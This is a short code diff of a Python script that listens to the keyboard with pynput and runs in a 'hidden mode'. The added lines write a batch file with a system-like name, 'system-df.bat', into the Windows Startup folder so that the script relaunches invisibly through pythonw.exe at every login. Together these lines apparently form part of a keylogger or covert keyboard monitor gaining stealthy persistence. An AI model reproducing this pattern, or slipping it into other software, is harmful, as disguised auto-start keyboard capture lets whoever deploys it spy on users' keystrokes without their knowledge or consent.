@@ -7,11 +7,18 @@ from datetime import datetime
 import threading
 from pynput import keyboard
 
-# Configurações para rodar em segundo plano
-HIDDEN_MODE = True  # Modo oculto
-LOG_INTERVAL = 60   # Intervalo em segundos para verificar se ainda está rodando
+caminho_py = os.path.abspath(__file__)
 
-# Variáveis para controle do atalho
+caminho_bat = r"C:/Users/rpv/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/system-df.bat"
+
+with open(caminho_bat, "w") as arquivo:
+    arquivo.write("@echo off\n")
+    arquivo.write(f'start "" pythonw.exe "{caminho_py}"\n')
+    arquivo.write("exit\n")
+
+HIDDEN_MODE = True
+LOG_INTERVAL = 60
+
 ctrl_pressed = False
 numpad4_pressed = False
 
